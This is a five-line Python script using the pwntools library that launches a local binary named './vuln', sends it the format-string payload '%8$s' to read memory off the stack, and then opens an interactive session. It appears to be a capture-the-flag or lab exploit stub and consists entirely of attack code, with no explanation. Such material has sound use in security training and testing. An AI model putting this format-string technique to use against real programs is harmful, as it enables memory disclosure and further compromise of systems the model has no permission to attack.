from pwn import *
p = process('./vuln')
payload = b'%8$s'
p.sendline(payload)
p.interactive()
